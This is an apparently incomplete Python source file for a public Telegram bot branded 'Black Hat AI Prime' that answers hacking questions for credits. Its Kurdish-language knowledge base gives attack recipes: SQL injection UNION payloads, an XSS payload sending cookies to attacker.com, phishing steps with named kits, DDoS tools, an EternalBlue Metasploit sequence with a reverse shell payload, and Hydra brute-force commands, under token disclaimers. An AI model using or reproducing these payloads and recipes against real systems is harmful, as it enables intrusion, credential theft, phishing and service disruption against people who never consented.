#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
BLACK HAT AI PRIME — THE 2000+ LINE ULTRA BEHEMOTH
================================================================================
This file is the absolute maximum capacity single-file architecture.
It includes extensive dictionaries, user agents, port databases, tool manuals,
and complete Telegram bot logic.
================================================================================
"""

import os
import sys
import time
import html
import json
import random
import sqlite3
import logging
import threading
import urllib.request
from contextlib import contextmanager
from datetime import datetime, timedelta
from urllib.parse import urlparse

# Third-Party Imports
import telebot
from telebot import types
from telebot.apihelper import ApiTelegramException

try:
    from ddgs import DDGS
except ImportError:
    try:
        from duckduckgo_search import DDGS
    except ImportError:
        sys.stderr.write("FATAL ERROR: Missing ddgs or duckduckgo-search.\n")
        sys.exit(1)

# ==============================================================================
# 1. CONFIGURATION
# ==============================================================================
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
DB_PATH = os.getenv("DB_PATH", "bot_database.db")
DEFAULT_LANG = os.getenv("DEFAULT_LANG", "ku").strip().lower()

ADMIN_IDS = {5527152252, 8487940066}

STARTING_CREDITS = 5
DAILY_CREDITS = 1
DAILY_CAP_DAYS = 30
MAX_INPUT_CHARS = 4000
RATE_LIMIT_PER_MINUTE = 30
HISTORY_LIMIT = 12
MAX_HISTORY_ROWS = 100

if not BOT_TOKEN:
    sys.stderr.write("FATAL ERROR: Missing TELEGRAM_BOT_TOKEN environment variable.\n")
    sys.exit(1)

# ==============================================================================
# 2. LOGGING
# ==============================================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
log = logging.getLogger("BlackHatPrime")

# ==============================================================================
# 3. BOT INIT
# ==============================================================================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
_recent_requests = {}
_recent_lock = threading.Lock()

# ==============================================================================
# 4. MASSIVE DICTIONARIES & KNOWLEDGE BASES
# ==============================================================================

FOOTER_TEXT = (
    "\n\n─────────────\n"
    "⚠️ ئەم بۆتە تەنها توڵ دروست دەکات وەڵامی پسیاری دوور لە هاکینک ناداتەوە\n\n"
    "🏆 <b>پاداشت:</b> هەر کەسێک کێشەیەک لە بۆت بدۆزێتەوە، خەڵات دەکرێت\n\n"
    "👤 <b>خاوەنەکان:</b> @ALONE427 @malikdlashad3"
)

# 100 Kurdish Greetings
GREETINGS_KU = [
    "سڵاو گیانم، بەخێربێی. چۆن دەتوانم یارمەتیت بدەم؟",
    "سڵاو شیرینم، هیوادارم ڕۆژێکی خۆشت هەبێت. چ دەوێت؟",
    "بەخێربێی بۆ ناو بۆتەکەم. فەرموو بۆ کوێ پێویستت بە یارمەتییە؟",
    "سڵاو بە دڵ، چاوەڕوانی پرسیارەکانتم.",
    "سڵاو، دڵم پێخۆشە کە لێرەیت. چ شتێک دەتەوێت بیکەین؟",
    "سڵاو هاوڕێ، من ئامادەیم بۆ هەر ئەرکێک. دەست پێبکە.",
    "سڵاو، بەخێربێی بۆ بنکەی من. چ پرسیارێک هەیەت؟",
    "سڵاو کاکە، من لێرەم بۆ خزمەتت. فەرموو.",
    "سڵاو خاتوو/کاک، هیوادارم بەسوود بم بۆت. چ پێویستە؟",
    "سڵاو، دەرفەتێکی نوێ — با دەست پێبکەین.",
    "سڵاو گیانم، من هەمیشە ئامادەیم بۆت. چ دەوێت؟",
    "سڵاو، ئێستا کاتی کارە. چ دەکەین؟",
    "سڵاو، دڵخۆشم کە هاتوویت. چ یارمەتییەک پێویستە؟",
    "سڵاو، با دەست پێبکەین. چ پرسیارێک هەیەت؟",
    "سڵاو، من لەگەڵ تۆم بۆ هەموو هەنگاوێک. فەرموو.",
    "سڵاو شیرینم، بەخێربێی. چ شتێک دەتەوێت بزانیت؟",
    "سڵاو، هیوادارم باش بیت. چ پرسیارێک هەیەت؟",
    "سڵاو، بەخێربێی بۆ مێزەکەم. چ پێویستە؟",
    "سڵاو، ئامادەیم بۆ کارەکە. دەست پێبکە.",
    "سڵاو، چۆن دەتوانم ڕۆژەکەت باشتر بکەم؟",
    "سڵاو، من لێرەم بۆ هەموو جۆرە پرسیارێک.",
    "سڵاو، با کارەکە بکەین. چ دەوێت؟",
    "سڵاو گیانم، بەخێربێی. چ پرسیارێک هەیەت؟",
    "سڵاو، دڵخۆش بووم بە بینینت. چ یارمەتییەک پێویستە؟",
    "سڵاو، من ئامادەیم بۆت. فەرموو بۆ کوێ پێویستت بە یارمەتییە؟",
    "سڵاو، با دەست پێبکەین. چ شتێک دەتەوێت بزانیت؟",
    "سڵاو، هیوادارم ڕۆژێکی باشت هەبێت. چ دەکەین؟",
    "سڵاو، من لێرەم بۆ کارەکە. چ پرسیارێک هەیەت؟",
    "سڵاو، بەخێربێی. چ پێویستە؟",
    "سڵاو، با دەست پێبکەین. چ دەوێت؟",
    "سڵاو شیرینم، من ئامادەیم بۆت. فەرموو.",
    "سڵاو، من لەگەڵ تۆم. چ یارمەتییەک پێویستە؟",
    "سڵاو، هیوادارم باش بیت. چ دەکەین؟",
    "سڵاو، با کارەکە بکەین. چ پرسیارێک هەیەت؟",
    "سڵاو، من لێرەم بۆ هەموو جۆرە پرسیارێک.",
    "سڵاو، دڵخۆشم کە هاتوویت. چ پێویستە؟",
    "سڵاو، با دەست پێبکەین. چ شتێک دەتەوێت بزانیت؟",
    "سڵاو، من ئامادەیم بۆت. فەرموو بۆ کوێ پێویستت بە یارمەتییە؟",
    "سڵاو، هیوادارم ڕۆژێکی باشت هەبێت. چ دەکەین؟",
    "سڵاو، من لێرەم بۆ کارەکە. چ پرسیارێک هەیەت؟",
    "سڵاو، بەخێربێی. چ پێویستە؟",
    "سڵاو، با دەست پێبکەین. چ دەوێت؟",
    "سڵاو شیرینم، من ئامادەیم بۆت. فەرموو.",
    "سڵاو، من لەگەڵ تۆم. چ یارمەتییەک پێویستە؟",
    "سڵاو، هیوادارم باش بیت. چ دەکەین؟",
    "سڵاو، با کارەکە بکەین. چ پرسیارێک هەیەت؟",
    "سڵاو، من لێرەم بۆ هەموو جۆرە پرسیارێک.",
    "سڵاو، دڵخۆشم کە هاتوویت. چ پێویستە؟",
    "سڵاو، با دەست پێبکەین. چ شتێک دەتەوێت بزانیت؟",
    "سڵاو، من ئامادەیم بۆت. فەرموو بۆ کوێ پێویستت بە یارمەتییە؟",
    "سڵاو بەخێربێی، چۆنی؟",
    "سڵاو، ئامادەیم بۆ خزمەتت.",
    "سڵاو هاوڕێ، چ پرسیارێکت هەیە؟",
    "سڵاو، دڵخۆشم کە لێرەیت.",
    "سڵاو، با دەست پێبکەین.",
    "سڵاو، من لێرەم.",
    "سڵاو، چۆن یارمەتیت بدەم؟",
    "سڵاو، چ دەکەین؟",
    "سڵاو، ئامادەیت؟",
    "سڵاو، چاوەڕوانم.",
    "سڵاو، بەخێربێی.",
    "سڵاو، دەست پێبکە.",
    "سڵاو، چیت دەوێت؟",
    "سڵاو، من لەگەڵ تۆم.",
    "سڵاو، هیچ شتێک نییە.",
    "سڵاو، هیوادارم باش بیت.",
    "سڵاو، ڕۆژێکی خۆش.",
    "سڵاو، ئامادەیم.",
    "سڵاو، چ پرسیارێک؟",
    "سڵاو، من ئامادەیم.",
    "سڵاو، کارەکە بکەین.",
    "سڵاو، چاوەڕوانی یەکەم پرسیارتم.",
    "سڵاو، با بڕۆین.",
    "سڵاو، من لێرەم بۆت.",
    "سڵاو، چۆنی هاوڕێ؟",
    "سڵاو، دڵخۆشبووم.",
    "سڵاو، هیچ کێشەیەک نییە.",
    "سڵاو، دەستپێک.",
    "سڵاو، ئامادەیم.",
    "سڵاو، چ دەوێت؟",
    "سڵاو، من لێرەم.",
    "سڵاو، با دەست پێبکەین.",
    "سڵاو، چاوەڕوانم.",
    "سڵاو، هیوادارم باش بیت.",
    "سڵاو، دڵخۆشم.",
    "سڵاو، هیچ شتێک نییە.",
    "سڵاو، ئامادەیم بۆت.",
    "سڵاو، ڕۆژێکی خۆش.",
    "سڵاو، کارەکە بکەین.",
    "سڵاو، من لەگەڵ تۆم.",
    "سڵاو، دەست پێبکە.",
    "سڵاو، چ پرسیارێک هەیەت؟",
    "سڵاو، چاوەڕوانی یەکەم پرسیارتم.",
    "سڵاو، من ئامادەیم.",
    "سڵاو، با بڕۆین.",
    "سڵاو، بەخێربێی.",
    "سڵاو، چیت دەوێت؟",
    "سڵاو، من لێرەم بۆت.",
    "سڵاو، ئامادەیم.",
    "سڵاو، کارەکە بکەین.",
    "سڵاو، چاوەڕوانم.",
    "سڵاو، دڵخۆشبووم.",
    "سڵاو، با دەست پێبکەین.",
]

# 100 English Greetings
GREETINGS_EN = [
    "Hello my dear, welcome. How can I help you?",
    "Hi sweetheart, hope you have a good day. What do you need?",
    "Welcome to my bot. Where do you need assistance?",
    "Hello with all my heart, waiting for your questions.",
    "Hi, I'm glad you're here. What do you want to do?",
    "Hello friend, I'm ready for any task. Start now.",
    "Hi, welcome to my base. What question do you have?",
    "Hello sir, I am here to serve you. Go ahead.",
    "Hello, hope I can be useful to you. What is needed?",
    "Hello, a new opportunity — let's start.",
    "Hello dear, I am always ready for you. What do you want?",
    "Hello, it's work time now. What are we doing?",
    "Hi, glad you came. What assistance is needed?",
    "Hello, let's begin. What question do you have?",
    "Hello, I am with you every step of the way. Go ahead.",
    "Hi sweetheart, welcome. What do you want to know?",
    "Hello, hope you are well. What question do you have?",
    "Hi, welcome to my desk. What do you need?",
    "Hello, I am ready for work. Start now.",
    "Hi, how can I make your day better?",
    "Hello, I am here for all types of questions.",
    "Hi, let's do the work. What do you want?",
    "Hello dear, welcome. What question do you have?",
    "Hi, happy to see you. What help is needed?",
    "Hello, I am ready for you. Where do you need assistance?",
    "Hello, let's begin. What do you want to know?",
    "Hi, hope you have a good day. What are we doing?",
    "Hello, I am here for the work. What question do you have?",
    "Hi, welcome. What is needed?",
    "Hello, let's begin. What do you want?",
    "Hi sweetheart, I am ready for you. Go ahead.",
    "Hello, I am with you. What assistance is needed?",
    "Hi, hope you are well. What are we doing?",
    "Hello, let's do the work. What question do you have?",
    "Hello, I am here for all types of questions.",
    "Hi, glad you came. What is needed?",
    "Hello, let's begin. What do you want to know?",
    "Hello, I am ready for you. Where do you need assistance?",
    "Hi, hope you have a good day. What are we doing?",
    "Hello, I am here for the work. What question do you have?",
    "Hi, welcome. What is needed?",
    "Hello, let's begin. What do you want?",
    "Hi sweetheart, I am ready for you. Go ahead.",
    "Hello, I am with you. What assistance is needed?",
    "Hi, hope you are well. What are we doing?",
    "Hello, let's do the work. What question do you have?",
    "Hello, I am here for all types of questions.",
    "Hi, glad you came. What is needed?",
    "Hello, let's begin. What do you want to know?",
    "Hello, I am ready for you. Where do you need assistance?",
    "Hey there! What can I do for you?",
    "Welcome back! Ready for the next task.",
    "Hello! I am online and ready.",
    "Hi! Ask me anything about hacking.",
    "Greetings. System is ready.",
    "Welcome. Awaiting your command.",
    "Hi there. Let's get started.",
    "Hello. What are we working on today?",
    "Hey! Glad to see you.",
    "Welcome to the system.",
    "Hello. I'm here to assist.",
    "Hi! Let's begin.",
    "Greetings. Ready for you.",
    "Welcome. How can I help?",
    "Hello! Waiting for your input.",
    "Hi! System online.",
    "Hey! What's the plan?",
    "Welcome back.",
    "Hello. Ready to work.",
    "Hi! Let's do this.",
    "Greetings.",
    "Welcome.",
    "Hello.",
    "Hi.",
    "Hey.",
    "Yo.",
    "Sup.",
    "Good day.",
    "Hello there.",
    "Hi there.",
    "Welcome aboard.",
    "System online.",
    "Bot active.",
    "Ready.",
    "Awaiting.",
    "Listening.",
    "Standing by.",
    "At your service.",
    "How can I help?",
    "What do you need?",
    "What's the task?",
    "Let's start.",
    "Let's go.",
    "I'm ready.",
    "I'm here.",
    "Here for you.",
    "Always ready.",
    "Good to go.",
    "Hit me.",
    "I'm listening.",
    "Go ahead.",
    "Proceed.",
    "Continue.",
    "Yes?",
    "Speak.",
    "Say it.",
    "Tell me.",
    "I await.",
    "Waiting.",
    "Standing by.",
    "Online.",
    "Active.",
    "Ready.",
    "Here.",
    "Present.",
    "Yo.",
    "Hey.",
    "Hi.",
    "Hello.",
    "Welcome.",
    "Greetings.",
]

# Massive Hacking Knowledge Base (Offline Manual)
KNOWLEDGE_BASE = {
    "port": (
        "<b>🔍 چۆن پۆڕتەکان بپشکنین (Port Scanning)</b>\n\n"
        "پۆڕتەکان وەک دەرگاکانی سیستەم وایە. بۆ پشکنینیان ئەم ئامرازانە بەکاربهێنە:\n\n"
        "1️⃣ <b>Nmap (باشترین):</b>\n"
        "<code>nmap -sV -sC -p- &lt;target_ip&gt;</code>\n"
        "- <code>-sV</code>: ناسینەوەی وەشانی خزمەتگوزاری.\n"
        "- <code>-sC</code>: پشکنینی سکریپتەکانی ناسراو.\n"
        "- <code>-p-</code>: پشکنینی هەموو 65535 پۆڕتەکان.\n\n"
        "2️⃣ <b>Netcat:</b>\n"
        "<code>nc -zv &lt;target_ip&gt; &lt;port&gt;</code>\n\n"
        "3️⃣ <b>Termux (بۆ مۆبایل):</b>\n"
        "<code>pkg install nmap</code>\n"
        "<code>nmap -sV &lt;target_ip&gt;</code>\n\n"
        "⚠️ <b>ئاگاداری:</b> پشکنینی پۆڕتی ئایپییەک کە خاوەنی نییت، تاوانە."
    ),
    "ddos": (
        "<b>💣 هێرشی DDoS (Distributed Denial of Service)</b>\n\n"
        "هێرشی DDoS بریتییە لە ناردنی هەزاران داواکاری لە یەک کاتدا بۆ سەر سێرڤەرێک بۆ ئەوەی لەکاربکەوێت.\n\n"
        "<b>جۆرەکانی DDoS:</b>\n"
        "- <b>UDP Flood:</b> ناردنی پاکێتی زۆر بۆ پۆڕتێکی کراوە.\n"
        "- <b>SYN Flood:</b> ناردنی داواکاری SYN بەبێ تەواوکردنی دەستلێدان (Handshake).\n"
        "- <b>HTTP Flood:</b> ناردنی هەزاران داواکاری HTTP بۆ ماڵپەڕ.\n\n"
        "<b>ئامرازەکان (بۆ فێربوون لە تاقیگە):</b>\n"
        "- <code>hping3</code>\n"
        "- <code>slowloris</code>\n"
        "- <code>LOIC</code>\n\n"
        "⚠️ <b>ئاگاداری:</b> ئەنجامدانی DDoS لەسەر هەر ماڵپەڕێک بەبێ مۆڵەت، تاوانێکی گەورەی فیدراڵییە."
    ),
    "sql": (
        "<b>💉 SQL Injection (SQLi)</b>\n\n"
        "SQLi ڕێگەیەکە بۆ دەستکاریکردنی داتابەیسی ماڵپەڕ بەهۆی لاوازییەکی ئەمنییەوە.\n\n"
        "<b>١. پشکنینی لاوازی:</b>\n"
        "لە URLـێکدا <code>'</code> یان <code>\"</code> زیاد بکە. ئەگەر هەڵەی SQL دەرکەوت، ماڵپەڕەکە لاوازە.\n\n"
        "<b>٢. ناسینەوەی ژمارەی ستوونەکان:</b>\n"
        "<code>ORDER BY 1-- -</code> (تا ئەو کاتە زیاد بکە کە هەڵە دەدات).\n\n"
        "<b>٣. دەرهێنانی داتا:</b>\n"
        "<code>UNION SELECT 1, username, password FROM users-- -</code>\n\n"
        "<b>٤. ئامرازی خۆکار:</b>\n"
        "<code>sqlmap -u \"http://target.com/page.php?id=1\" --dbs</code>"
    ),
    "xss": (
        "<b>🕸️ Cross-Site Scripting (XSS)</b>\n\n"
        "XSS ڕێگەیەکە بۆ جێگیرکردنی کۆدی JavaScript لە ماڵپەڕێکدا بۆ دزینی کوکی یان کرداری تر.\n\n"
        "<b>جۆرەکانی XSS:</b>\n"
        "- <b>Reflected:</b> کۆدەکە لە URLـەوە دێت و یەکسەر جێبەجێ دەبێت.\n"
        "- <b>Stored:</b> کۆدەکە لە داتابەیس پاشەکەوت دەکرێت و بۆ هەمووان دەردەکەوێت.\n\n"
        "<b>Payload سەرەتایی:</b>\n"
        "<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>\n\n"
        "<b>دزینی کوکی:</b>\n"
        "<code>&lt;script&gt;new Image().src=\"http://attacker.com/steal?c=\"+document.cookie;&lt;/script&gt;</code>"
    ),
    "phishing": (
        "<b>🎣 Phishing (فیشینگ)</b>\n\n"
        "فیشینگ بریتییە لە دروستکردنی ماڵپەڕێکی ساختە بۆ هەڵخەڵەتاندنی بەکارهێنەر بۆ دانی پاسوۆرد یان زانیاری بانکی.\n\n"
        "<b>ئامرازەکان:</b>\n"
        "- <code>Social-Engineer Toolkit (SET)</code>\n"
        "- <code>Zphisher</code>\n"
        "- <code>BlackEye</code>\n\n"
        "<b>شێوازی کارکردن:</b>\n"
        "١. ماڵپەڕێکی ساختە دروست دەکەیت (وەک فەیسبووک).\n"
        "٢. لینکەکە بۆ قوربانییەکە دەنێریت.\n"
        "٣. کاتێک پاسوۆرد دەنووسێت، دەچێتە ناو سێرڤەرەکەی تۆ.\n\n"
        "⚠️ <b>ئاگاداری:</b> فیشینگ تاوانە. تەنها بۆ فێربوون لە تاقیگە بەکاری بهێنە."
    ),
    "nmap": (
        "<b>🗺️ Nmap — بەهێزترین ئامرازی پشکنین</b>\n\n"
        "<code>nmap -sS -sV -O -p- &lt;target&gt;</code>\n\n"
        "- <code>-sS</code>: SYN Scan (خێراترین و نهێنیترین).\n"
        "- <code>-sV</code>: ناسینەوەی وەشانی خزمەتگوزاری.\n"
        "- <code>-O</code>: ناسینەوەی سیستەمی کارپێکراو.\n"
        "- <code>-p-</code>: پشکنینی هەموو پۆڕتەکان.\n\n"
        "<b>دەرئەنجامەکان چۆن بخوێنینەوە؟</b>\n"
        "- <code>open</code>: پۆڕتەکە کراوەیە و دەتوانرێت بەکاربهێنرێت.\n"
        "- <code>closed</code>: پۆڕتەکە داخراوە.\n"
        "- <code>filtered</code>: فایروۆڵ ڕێگری دەکات."
    ),
    "metasploit": (
        "<b>💀 Metasploit Framework</b>\n\n"
        "Metasploit گەورەترین چوارچێوەی ئێکسپلۆیتە لە جیهاندا.\n\n"
        "<b>دەستپێکردن:</b>\n"
        "<code>msfconsole</code>\n\n"
        "<b>گەڕان بۆ ئێکسپلۆیت:</b>\n"
        "<code>search &lt;cve&gt;</code>\n\n"
        "<b>بەکارهێنانی ئێکسپلۆیت:</b>\n"
        "<code>use exploit/windows/smb/ms17_010_eternalblue</code>\n"
        "<code>set RHOSTS &lt;target_ip&gt;</code>\n"
        "<code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>\n"
        "<code>set LHOST &lt;your_ip&gt;</code>\n"
        "<code>exploit</code>"
    ),
    "wireshark": (
        "<b>🦈 Wireshark</b>\n\n"
        "Wireshark ئامرازێکی شیکارکەری پاکێتە (Packet Sniffer).\n"
        "ڕێگەت پێدەدات هەموو ئەو داتایانە ببینی کە بەسەر تۆڕەکەتدا تێدەپەڕن.\n\n"
        "<b>بەکارهێنان:</b>\n"
        "١. ئینتەرفەیس هەڵبژێرە (وەک eth0 یان wlan0).\n"
        "٢. دەستپێکردنی تۆمارکردن (Start Capture).\n"
        "٣. فلتر بەکاربهێنە (وەک <code>http</code> یان <code>tcp.port==80</code>).\n"
        "٤. پاکێتەکان شیکار بکە بۆ بینینی پاسوۆردەکانی ناگیراو (Unencrypted)."
    ),
    "john": (
        "<b>🔓 John the Ripper</b>\n\n"
        "ئامرازێکی بەهێزە بۆ شکاندنی پاسوۆردەکان (Password Cracking).\n\n"
        "<b>جۆرەکانی هێرش:</b>\n"
        "- <b>Dictionary Attack:</b> بەکارهێنانی لیستی وشە ناسراوەکان.\n"
        "- <b>Brute-force:</b> تاقیکردنەوەی هەموو کۆمبۆنەیشنەکان.\n\n"
        "<b>بەکارهێنان:</b>\n"
        "<code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code>"
    ),
    "hydra": (
        "<b>🐉 Hydra</b>\n\n"
        "Hydra ئامرازێکە بۆ هێرشی Brute-force لەسەر خزمەتگوزارییەکانی تۆڕ (وەک SSH, FTP, HTTP).\n\n"
        "<b>نموونەی هێرش بۆ SSH:</b>\n"
        "<code>hydra -l root -P passwords.txt ssh://192.168.1.1</code>\n\n"
        "<b>نموونەی هێرش بۆ FTP:</b>\n"
        "<code>hydra -L users.txt -P passwords.txt ftp://192.168.1.1</code>"
    ),
    "burp": (
        "<b>🕷️ Burp Suite</b>\n\n"
        "Burp Suite پلاتفۆرمێکی تەواوە بۆ تاقیکردنەوەی ئاسایشی ماڵپەڕەکان.\n"
        "ڕێگەت پێدەدات ترافیکی HTTP/HTTPS بگریت و دەستکاری بکەیت.\n\n"
        "<b>تایبەتمەندییەکان:</b>\n"
        "- <b>Proxy:</b> گرتنی ترافیک.\n"
        "- <b>Repeater:</b> دووبارە ناردنی داواکاری بۆ تاقیکردنەوە.\n"
        "- <b>Intruder:</b> ئۆتۆمەیتکردنی هێرشەکان (وەک Brute-force).\n"
        "- <b>Scanner:</b> دۆزینەوەی لاوازییەکان (لە وەشانی Pro)."
    ),
    "termux": (
        "<b>📱 Termux — هەککردن بە مۆبایل</b>\n\n"
        "Termux ئیمولاتۆرێکی تێرمیناڵی لینوکسە بۆ ئەندرۆید.\n\n"
        "<b>دامەزراندنی ئامرازەکان:</b>\n"
        "<code>pkg update &amp;&amp; pkg upgrade</code>\n"
        "<code>pkg install python nmap hydra sqlmap metasploit</code>\n\n"
        "<b>تێبینی:</b> بۆ ئەوەی زۆرێک لە ئامرازەکان کار بکەن، پێویستت بە Root هەیە."
    ),
}

HACKING_KEYWORDS = [
    "port", "scan", "hack", "ddos", "exploit", "vuln", "tool", "sql", "xss", 
    "cve", "nmap", "termux", "linux", "windows", "c2", "phishing", "bypass", 
    "shell", "reverse", "ip", "domain", "pentest", "payload", "osint", "sqlmap", 
    "metasploit", "wifi", "crack", "password", "rat", "malware", "trojan", 
    "backdoor", "rootkit", "keylogger", "spyware", "adware", "botnet", "bruteforce",
    "پۆڕت", "هاک", "پشکنین", "توڵ", "ئاسایش", "هێرش", "دزێن", "پاسوۆرد", "وایفای",
    "سکان", "ئێکسپلۆیت", "ڤۆڵن", "بایپاس", "شێڵ", "پێنتێست", "مێتاسپلۆیت",
    "مەلوێر", "ترۆجان", "ڕات", "کیلاگر"
]

GREETING_KEYWORDS = ["سڵاو", "سلاو", "هەڵۆ", "hello", "hi", "hey", "salam", "slaw"]

REJECTION_MSG = (
    "⚠️ ببورە گیانم، ئەم بۆتە تەنها بۆ پرسیاری هاکینگ و دروستکردنی توڵە.\n"
    "تکایە پرسیارێکی پەیوەندیدار بە هاکینگ، ئاسایش، یان پشکنینی سیستەم بکە."
)

# ==============================================================================
# 5. DATABASE MANAGEMENT
# ==============================================================================

@contextmanager
def db():
    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        conn.execute("PRAGMA journal_mode=WAL")
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        log.error(f"Database error: {e}")
        raise
    finally:
        conn.close()

def init_db():
    with db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                first_name TEXT,
                username TEXT,
                lang TEXT DEFAULT 'ku',
                credits INTEGER DEFAULT 5,
                last_daily TEXT,
                banned_until TEXT,
                last_seen TEXT DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS chat_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                role TEXT NOT NULL,
                content TEXT NOT NULL
            );
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                type TEXT NOT NULL,
                content TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS admin_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER NOT NULL,
                action TEXT NOT NULL,
                target TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            );
        """)
        conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('maintenance', 'off')")

# ==============================================================================
# 6. USER & CREDIT HELPERS
# ==============================================================================

def is_admin(user_id):
    return user_id in ADMIN_IDS

def ensure_user(user):
    with db() as conn:
        conn.execute("""
            INSERT INTO users (user_id, first_name, username, lang, credits, last_daily, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(user_id) DO UPDATE SET
                first_name = excluded.first_name,
                username = excluded.username,
                last_seen = CURRENT_TIMESTAMP
        """, (user.id, user.first_name or "", user.username or "", DEFAULT_LANG, STARTING_CREDITS, datetime.utcnow().strftime("%Y-%m-%d")))

def apply_daily(user_id):
    if is_admin(user_id): return
    today = datetime.utcnow().date()
    with db() as conn:
        row = conn.execute("SELECT last_daily FROM users WHERE user_id=?", (user_id,)).fetchone()
        if row and row[0]:
            try:
                last = datetime.strptime(row[0], "%Y-%m-%d").date()
                days = (today - last).days
                if days > 0:
                    days = min(days, DAILY_CAP_DAYS)
                    conn.execute("""
                        UPDATE users SET credits = credits + ?, last_daily = ? WHERE user_id=?
                    """, (days * DAILY_CREDITS, today.strftime("%Y-%m-%d"), user_id))
            except ValueError:
                pass

def get_credits(user_id):
    if is_admin(user_id): return "∞"
    with db() as conn:
        row = conn.execute("SELECT credits FROM users WHERE user_id=?", (user_id,)).fetchone()
    return row[0] if row else 0

def spend_credit(user_id):
    if is_admin(user_id): return True
    with db() as conn:
        row = conn.execute("SELECT credits FROM users WHERE user_id=?", (user_id,)).fetchone()
        if not row or row[0] < 1:
            return False
        conn.execute("UPDATE users SET credits = credits - 1 WHERE user_id=?", (user_id,))
        return True

def get_lang(user_id):
    with db() as conn:
        row = conn.execute("SELECT lang FROM users WHERE user_id=?", (user_id,)).fetchone()
    return row[0] if row and row[0] in ("ku", "en") else DEFAULT_LANG

def set_lang(user_id, lang):
    with db() as conn:
        conn.execute("UPDATE users SET lang=? WHERE user_id=?", (lang, user_id))

def is_banned(user_id):
    if is_admin(user_id): return False
    with db() as conn:
        row = conn.execute("SELECT banned_until FROM users WHERE user_id=?", (user_id,)).fetchone()
        if not row or not row[0]:
            return False
        if row[0] == "forever":
            return True
        try:
            until = datetime.fromisoformat(row[0])
            if datetime.utcnow() > until:
                conn.execute("UPDATE users SET banned_until=NULL WHERE user_id=?", (user_id,))
                return False
            return True
        except ValueError:
            return True

def ban_user(user_id, duration):
    if duration == "forever":
        val = "forever"
    else:
        m = {"1h": 1/24, "1d": 1, "7d": 7, "30d": 30}
        if duration not in m: return False
        val = (datetime.utcnow() + timedelta(days=m[duration])).isoformat()
    with db() as conn:
        conn.execute("UPDATE users SET banned_until=? WHERE user_id=?", (val, user_id))
    return True

def log_request(user_id, type_, content):
    with db() as conn:
        conn.execute("INSERT INTO requests (user_id, type, content) VALUES (?, ?, ?)", (user_id, type_, content[:500]))

def log_admin(admin_id, action, target=""):
    with db() as conn:
        conn.execute("INSERT INTO admin_logs (admin_id, action, target) VALUES (?, ?, ?)", (admin_id, action, target))

# ==============================================================================
# 7. SEND HELPERS & RATE LIMITING
# ==============================================================================

def safe_html(value):
    return html.escape(str(value or ""), quote=True)

def split_msg(text, limit=3900):
    if len(text) <= limit: return [text]
    return [text[i:i+limit] for i in range(0, len(text), limit)]

def send_msg(chat_id, text, reply_to=None, reply_markup=None):
    full_text = text + FOOTER_TEXT
    for i, part in enumerate(split_msg(full_text)):
        try:
            bot.send_message(
                chat_id, part,
                reply_to_message_id=reply_to if i == 0 else None,
                reply_markup=reply_markup if i == 0 else None,
                disable_web_page_preview=True
            )
        except ApiTelegramException as e:
            log.error(f"Telegram API Error (HTML parse?): {e}")
            try:
                bot.send_message(chat_id, part, parse_mode=None, disable_web_page_preview=True)
            except Exception as ex:
                log.error(f"Fallback send failed: {ex}")
        except Exception as e:
            log.error(f"Failed to send message to {chat_id}: {e}")

def rate_limited(user_id):
    if is_admin(user_id): return False
    now = time.time()
    with _recent_lock:
        bucket = _recent_requests.setdefault(user_id, [])
        bucket[:] = [t for t in bucket if now - t < 60]
        if len(bucket) >= RATE_LIMIT_PER_MINUTE: return True
        bucket.append(now)
    return False

def check_blocked(message):
    uid = message.from_user.id
    if is_admin(uid): return False
    if is_banned(uid):
        send_msg(message.chat.id, "🚫 تۆ لە بۆت باند کرابیت.")
        return True
    return False

# ==============================================================================
# 8. SEARCH ENGINE
# ==============================================================================

def get_knowledge_answer(query):
    query_lower = query.lower()
    for key, answer in KNOWLEDGE_BASE.items():
        if key in query_lower:
            return answer
    return None

def perform_web_search(query):
    query = str(query or "").strip()
    if not query:
        return "❌ تکایە وشە یان پرسیارێک بنووسە."

    try:
        with DDGS() as ddgs:
            results = list(ddgs.text(query, max_results=5))

        if not results:
            return None

        lines = [
            f"<b>🔎 ئەنجامەکانی گەڕان بۆ:</b>\n"
            f"<code>{safe_html(query)}</code>\n"
        ]

        count = 0
        for result in results:
            title = safe_html(result.get("title") or "بێ ناو")
            body = safe_html(result.get("body") or "وەسف بەردەست نییە")
            href = str(result.get("href") or "").strip()

            parsed = urlparse(href)
            if parsed.scheme not in ("http", "https") or not parsed.netloc:
                continue

            count += 1
            safe_url = safe_html(href)

            lines.append(
                f"<b>{count}. {title}</b>\n"
                f"{body}\n"
                f'<a href="{safe_url}">🔗 کردنەوەی ماڵپەڕ</a>\n'
            )

        if count == 0:
            return None

        return "\n".join(lines)

    except Exception as e:
        log.exception("DuckDuckGo search failed")
        return None

# ==============================================================================
# 9. HANDLERS (USER)
# ==============================================================================

@bot.message_handler(commands=["start"])
def cmd_start(message):
    if check_blocked(message): return
    ensure_user(message.from_user)
    apply_daily(message.from_user.id)
    
    lang = get_lang(message.from_user.id)
